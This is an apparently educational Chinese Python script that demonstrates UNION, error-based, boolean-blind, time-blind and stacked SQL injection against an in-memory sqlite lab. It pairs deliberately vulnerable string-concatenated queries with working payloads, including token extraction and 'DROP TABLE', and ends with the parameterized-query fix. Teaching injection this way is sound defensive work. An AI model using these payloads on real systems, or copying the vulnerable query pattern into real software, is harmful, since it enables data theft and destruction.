#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Day 151 · 示例 01：SQL 注入原理与五类注入演示（基础用法）
=========================================================

⚠️ 伦理与范围声明（先读这段再读代码）
------------------------------------
本文件的全部演示都运行在**进程内存里的 sqlite3 `:memory:` 靶场**上，
数据库随进程结束而消失，不连接任何网络服务、不触碰任何真实站点。
目的是让你**亲眼看见**"一个字符串拼接的查询"能被解释成什么样的 SQL，
从而理解参数化查询到底在防什么。

**请勿**把这里的写法改成攻击真实系统的 payload 集合并使用。
未经授权对他人系统发起注入测试，在中国属于《刑法》第 285/286 条规制的
违法行为。要练手，请用自己搭的靶场（本文件就是靶场本身）。

本示例覆盖五类注入：
    ① UNION 注入   —— 用 UNION 把别的表的数据"接"到结果集里
    ② 报错注入     —— 靠数据库报错信息泄漏结构（列数、表名……）
    ③ 布尔盲注     —— 页面没有数据回显，只靠"有/无结果"判断真假
    ④ 时间盲注     —— 连真假都看不见，只靠响应时间差判断真假
    ⑤ 堆叠注入     —— 用 `;` 追加第二条语句，如 DROP TABLE

运行
----
    python3 01-sql-injection-basics.py
"""

import sqlite3
import time

# ──────────────────────────────────────────────────────────────────
# 时间盲注用的"重表达式"：一个递归 CTE 数到 40 万，约耗时 50~80ms。
# 它本身不做任何坏事，只是"慢"—— 这是时间盲注唯一的测量信号。
# ✨ 为什么慢能当信号？因为攻击者只关心"服务器这次响应是不是明显变慢"，
#    慢=条件为真，快=条件为假，一个比特的答案就这么传出来了。
# ──────────────────────────────────────────────────────────────────
HEAVY_ITER = 400_000
HEAVY_EXPR = (
    "(SELECT count(*) FROM (WITH RECURSIVE cc(n) AS "
    f"(SELECT 1 UNION ALL SELECT n+1 FROM cc WHERE n<{HEAVY_ITER}) SELECT n FROM cc))"
)


def banner(title: str) -> None:
    print("\n" + "═" * 70)
    print(f"  {title}")
    print("═" * 70)


def sub(title: str) -> None:
    print(f"\n── {title} " + "─" * max(0, 60 - len(title)))


# ══════════════════════════════════════════════════════════════════
# ① 靶场：一个内存数据库 + 两个"故意写错"的接口
# ══════════════════════════════════════════════════════════════════

SCHEMA = """
CREATE TABLE users (
    id        INTEGER PRIMARY KEY,
    username  TEXT NOT NULL,
    password  TEXT NOT NULL,     -- 真实系统存哈希；这里明文是为了演示方便
    role      TEXT NOT NULL,
    api_token TEXT NOT NULL      -- 攻击者的真正目标：凭证
);
CREATE TABLE secrets (
    id      INTEGER PRIMARY KEY,
    owner   TEXT NOT NULL,
    content TEXT NOT NULL
);
CREATE TABLE search_log (
    id   INTEGER PRIMARY KEY,
    term TEXT
);
"""


def make_range() -> sqlite3.Connection:
    """构建本地靶场。注意 `:memory:`：数据库只存在于内存，进程退出即销毁。"""
    conn = sqlite3.connect(":memory:")
    conn.executescript(SCHEMA)
    conn.executemany(
        "INSERT INTO users (username, password, role, api_token) VALUES (?, ?, ?, ?)",
        [
            ("admin",  "admin123",   "administrator", "tk9xq2"),
            ("alice",  "alice_pw",   "user",          "u_alice_01"),
            ("bob",    "bob_pw",     "user",          "u_bob_0002"),
        ],
    )
    conn.executemany(
        "INSERT INTO secrets (owner, content) VALUES (?, ?)",
        [
            ("admin", "内部定价表：成本 12.5 元 / 售价 99 元"),
            ("admin", "数据库备份口令：backup!2024"),
        ],
    )
    conn.commit()
    return conn


# ── 故意写错的接口 1：用户资料查询（字符串拼接）──────────────
def insecure_user_profile(conn: sqlite3.Connection, name: str) -> list:
    """❌ 反例：用 f-string 把参数拼进 SQL。

    ✨ 为什么这会出事？因为 SQL 是一门**语言**，不是普通字符串。
    拼接之后，数据库收到的是"一句话"，它**无法区分**哪部分是程序原本
    的意思、哪部分是用户输入的数据。用户输入里的 `'`、`UNION`、`--`
    会被当成 SQL **语法**来解析 —— 于是数据变成了代码。
    """
    sql = f"SELECT id, username, role FROM users WHERE username = '{name}'"
    return conn.execute(sql).fetchall()


# ── 故意写错的接口 2：判断用户是否存在（返回布尔值）──────────
def insecure_user_exists(conn: sqlite3.Connection, name: str) -> bool:
    """❌ 反例：同样拼接，但只返回 True/False（盲注的典型场景）。"""
    sql = f"SELECT count(*) FROM users WHERE username = '{name}'"
    return conn.execute(sql).fetchone()[0] > 0


# ── 故意写错的接口 3：列表页（无任何回显，只看耗时）──────────
def insecure_slow_endpoint(conn: sqlite3.Connection, name: str) -> None:
    """❌ 反例：查询结果不返回给用户，页面上什么都看不到。

    但 SQL 仍然被完整执行了 —— 所以攻击者仍然可以让它"变慢"。
    这就是时间盲注：**只要语句被执行，就存在盲注信道**。
    """
    sql = f"SELECT username FROM users WHERE username = '{name}'"
    conn.execute(sql).fetchall()


# ── 故意写错的接口 4：批量脚本（允许多语句 = 堆叠注入的土壤）──
def insecure_batch_search(conn: sqlite3.Connection, name: str) -> None:
    """❌ 反例：用 executescript() 执行"多语句脚本"。

    ✨ 为什么这比 execute() 危险？sqlite3 的 execute() **只允许一条语句**
    （它会拒绝 `;` 后面的内容），这是标准库送的免费防护；而
    executescript() 是"我要跑一整个脚本"的设计，天然允许多条语句，
    于是 `;` 之后就能插入任意新的语句（DROP / UPDATE / INSERT）。
    """
    script = (
        "DELETE FROM search_log;"
        f" INSERT INTO search_log (term) SELECT username FROM users WHERE username = '{name}';"
    )
    conn.executescript(script)


# ══════════════════════════════════════════════════════════════════
# ② 攻击者视角：五类注入逐个复现（全部只打本地内存靶场）
# ══════════════════════════════════════════════════════════════════

def demo_normal(conn: sqlite3.Connection) -> None:
    banner("0. 先看正常用法（建立对照基线）")
    print("正常输入 name='alice' →")
    print("   ", insecure_user_profile(conn, "alice"))
    print("\n正常输入 name='bob' →")
    print("   ", insecure_user_profile(conn, "bob"))
    print("\n📌 记住这个形状：返回的是 [(id, username, role), ...]，共 3 列。")


def demo_union(conn: sqlite3.Connection) -> None:
    banner("① UNION 注入：把别的表的数据接到结果集里")

    payload = "nobody' UNION SELECT 1, owner, content FROM secrets--"
    print("攻击者输入：")
    print(f"   name = {payload}")
    print("\n服务端实际执行的 SQL：")
    print("   SELECT id, username, role FROM users WHERE username = 'nobody'")
    print("   UNION SELECT 1, owner, content FROM secrets--'")
    print("\n✨ 原理：")
    print("   • 前半句查不到任何人（nobody 不存在）→ 空集")
    print("   • UNION 要求两侧**列数相同**（这里都是 3 列），于是 secrets 表")
    print("     的 owner / content 被当成 username / role 返回")
    print("   • 结尾的 `--` 把 SQL 剩下那个单引号注释掉，语法才合法")
    print("\n攻击者拿到：")
    for row in insecure_user_profile(conn, payload):
        print("   ", row)
    print("\n🛡️ 防御要点：查询接口**永远不要**让原始输入参与 SQL 语法；")
    print("   同时数据库账号要最小权限 —— 用户表账号不该读得到 secrets 表。")


def demo_error_based(conn: sqlite3.Connection) -> None:
    banner("② 报错注入：数据库的报错信息就是情报")

    sub("2.1 语法错误泄漏了 SQL 原文")
    try:
        insecure_user_profile(conn, "'")
    except sqlite3.OperationalError as e:
        print("输入 name = \"'\" → 抛出：", repr(str(e)))
        print("✨ 报错里出现了 `\"'\"` 这个片段，说明参数是**直接拼进** SQL 的；")
        print("   而参数化查询的报错不会是这种形状（后面会对比）。")

    sub("2.2 列数错误泄漏了表结构")
    try:
        insecure_user_profile(conn, "x' UNION SELECT 1,2--")
    except sqlite3.OperationalError as e:
        print("输入 name = x' UNION SELECT 1,2-- → 抛出：", repr(str(e)))
        print("✨ 报错直接告诉攻击者『左右两边列数不一致』—— 试 1、2、3 列")
        print("   就能测出目标查询是 3 列。这叫『列数探测』，是 UNION 注入第一步。")

    sub("2.3 表名也能直接问出来")
    rows = conn.execute(
        "SELECT name FROM sqlite_master WHERE type='table'"
    ).fetchall()
    print("攻击者最终常用 sqlite_master 列全部表名（这里直接在靶场上演示）：")
    print("   ", [r[0] for r in rows])
    print("✨ 防御要点：生产环境**永远不要**把异常原文回显给用户；")
    print("   统一返回『系统繁忙』，把详情写进服务端日志。")


def demo_boolean_blind(conn: sqlite3.Connection) -> None:
    banner("③ 布尔盲注：没有数据回显，只有 True/False")

    print("假设接口只返回『该用户是否存在』：")
    print("   name='alice' →", insecure_user_exists(conn, "alice"))
    print("   name='nobody' →", insecure_user_exists(conn, "nobody"))

    print("\n注入探测语句（把『是否存在』变成『条件是否成立』）：")
    probe = "nobody' OR substr((SELECT api_token FROM users WHERE username='admin'),1,1)='t'--"
    print(f"   name = {probe}")
    print(f"   → 返回 {insecure_user_exists(conn, probe)}  ← 说明 admin 令牌首字母是 't'")
    print("   （原理：前半句 nobody 不存在，整个 WHERE 的真假完全由 OR 右边决定；")
    print("     若用 AND 则左边已经是假，结果恒为假 —— 这是真实的盲注细节）")

    sub("3.1 用这一个比特，把 admin 的 api_token 逐字符问出来")
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    token = ""
    queries = 0
    for pos in range(1, 8):                      # 假设已知长度 6，多取一位做哨兵
        for ch in alphabet:
            queries += 1
            cond = (
                "substr((SELECT api_token FROM users WHERE username='admin'),"
                f"{pos},1)='{ch}'"
            )
            if insecure_user_exists(conn, f"nobody' OR {cond}--"):
                token += ch
                break
        else:
            break                                 # 没有字符匹配 = 到字符串末尾了
    print(f"   盲注提取结果：api_token = {token!r}")
    print(f"   共发出 {queries} 次请求，每次只泄漏 1 bit 左右的信息。")
    print("✨ 这正是盲注可怕的地方：单次请求看不出任何异常，")
    print("   但成千上万次请求能拼出完整数据 —— 所以**速率限制**和**异常查询量告警**")
    print("   是盲注的重要检测手段。")


def demo_time_blind(conn: sqlite3.Connection) -> None:
    banner("④ 时间盲注：连 True/False 都看不到，只看响应时间")

    print("这个接口什么都不返回（屏幕上永远一样），但 SQL 照样被执行：")
    print("   SELECT username FROM users WHERE username = '<name>'")

    sub("4.1 构造一个『条件为真就变慢』的语句")
    print("时间盲注的经典构造：")
    print("   ... WHERE username='nobody' OR CASE WHEN (条件) THEN <重表达式> ELSE 0 END")
    print(f"   其中 <重表达式> 是一个数到 {HEAVY_ITER:,} 的递归 CTE，耗时约 50~80ms。")
    print("   ⚠️ 必须用 OR：若用 AND，左边 username='nobody' 已经为假，")
    print("      数据库会**短路跳过**右边表达式，那就不执行重表达式了。")

    for label, cond in [
        ("条件 为真 (1=1)", "1=1"),
        ("条件 为假 (1=2)", "1=2"),
    ]:
        payload = (
            f"nobody' OR CASE WHEN ({cond}) THEN {HEAVY_EXPR} ELSE 0 END--"
        )
        t0 = time.perf_counter()
        insecure_slow_endpoint(conn, payload)
        dt = (time.perf_counter() - t0) * 1000
        print(f"\n   {label}：响应耗时 {dt:7.1f} ms")

    print("\n✨ 原理：攻击者根本不需要看到结果，他只需要反复测量『这次慢不慢』。")
    print("   慢 → 条件为真；快 → 条件为假。把条件换成")
    print("   substr((SELECT api_token ...),N,1)='x'，就能一个字一个字地盲取。")
    print("\n🛡️ 防御要点：")
    print("   • 参数化查询（根治）；")
    print("   • 设置 statement timeout，让慢查询直接被杀掉；")
    print("   • 监控 P99 延迟与『同一来源的高频相似查询』。")


def demo_stacked(conn: sqlite3.Connection) -> None:
    banner("⑤ 堆叠注入：用 `;` 追加第二条语句")

    print("先确认 secrets 表还在：",
          conn.execute("SELECT count(*) FROM secrets").fetchone()[0], "行")

    print("\n这个接口用 executescript() 跑『批量脚本』—— 它允许多条语句：")
    payload = "x'; DROP TABLE secrets;--"
    print(f"   name = {payload}")
    print("实际执行：")
    print("   DELETE FROM search_log;")
    print("   INSERT INTO search_log (term) SELECT username FROM users")
    print("     WHERE username = 'x';     ← 到这里就已经是合法的完整语句了")
    print("   DROP TABLE secrets;          ← `;` 追加的第二条语句，直接删表")
    insecure_batch_search(conn, payload)

    try:
        conn.execute("SELECT count(*) FROM secrets")
    except sqlite3.OperationalError as e:
        print(f"\n再查 secrets 表 → 报错：{e}")
        print("💥 表已经没了。这就是堆叠注入：从『读数据』升级成『改结构』。")

    sub("5.1 对比：sqlite3 的 execute() 只允许一条语句（标准库的免费防护）")
    try:
        conn.execute("SELECT 1; DROP TABLE users;")
    except sqlite3.Warning as e:
        print("conn.execute('SELECT 1; DROP TABLE users;') →", repr(str(e)))
    except sqlite3.Error as e:
        print("conn.execute(...) →", type(e).__name__, repr(str(e)))
    print("✨ 注意：这是**驱动层**的保护，不是所有数据库驱动都有")
    print("   （比如 MySQL 的某些客户端默认允许多语句）。")
    print("   真正可靠的防御仍然只有一条：**参数化查询**。")


# ══════════════════════════════════════════════════════════════════
# ③ 防御者视角：同样的输入，改一个写法就安全了
# ══════════════════════════════════════════════════════════════════

def safe_user_profile(conn: sqlite3.Connection, name: str) -> list:
    """✅ 正例：参数化查询（占位符 `?` + 参数元组）。

    ✨ 为什么这样就不注入了？关键在**发送顺序**：
    1. 先把带 `?` 的 SQL **模板**发给数据库，数据库立刻编译成
       "查询计划"（字节码）—— 此时语句结构已经**定死**；
    2. 再把参数值单独发过去，数据库把它们**当成纯数据**填进占位符。

    参数永远只是"值"，**不可能**变成 SQL 语法（不能变成 UNION、不能变成 `;`、
    不能变成注释符），所以注入在物理上就不可能发生。
    这就是"数据与代码分离"（data/code separation）。
    """
    return conn.execute(
        "SELECT id, username, role FROM users WHERE username = ?", (name,)
    ).fetchall()


def demo_fix(conn: sqlite3.Connection) -> None:
    banner("⑥ 修复验证：同样的 payload，参数化之后全部失效")

    payloads = [
        "alice",                                                       # 正常数据仍可用
        "nobody' UNION SELECT 1, owner, content FROM secrets--",
        "'",
        "x' UNION SELECT 1,2--",
        "x'; DROP TABLE users;--",
    ]
    for p in payloads:
        rows = safe_user_profile(conn, p)
        print(f"   name={p[:46]!r:<48} → 结果 {rows}")
    print("\n✨ 结论：这些字符串全部被当成**普通用户名**去比对，")
    print("   没有一个是合法用户名，所以统一返回空列表 ——")
    print("   既没有数据泄漏，也没有报错信息，也没有表被删。")
    print("\n📌 一句话记住：**参数化查询不是『转义』（escaping），而是『结构化隔离』。**")
    print("   转义总有绕过的可能（编码、字符集、宽字节……），")
    print("   而参数化根本不给你进入语法层的机会。")


def main() -> None:
    conn = make_range()
    demo_normal(conn)
    demo_union(conn)
    demo_error_based(conn)
    demo_boolean_blind(conn)
    demo_time_blind(conn)
    demo_stacked(conn)
    demo_fix(conn)

    banner("小结")
    print("""
• 注入的根因只有一个：**用户输入被当成了 SQL 代码**。
  五类注入只是"信息回传方式"不同：
      UNION 注入   → 有数据回显，直接读走
      报错注入     → 没有回显但报错可见，靠报错泄漏结构
      布尔盲注     → 只有 True/False 回显
      时间盲注     → 什么回显都没有，只有耗时
      堆叠注入     → 能用 `;` 追加语句，可写可删
• 防御的根因也只有一条：**让输入只做数据，不做代码** → 参数化查询。
• 辅助防御（不能替代参数化）：最小权限数据库账号、关闭详细报错、
  语句超时、查询速率限制、WAF、日志与告警。
""")


if __name__ == "__main__":
    main()
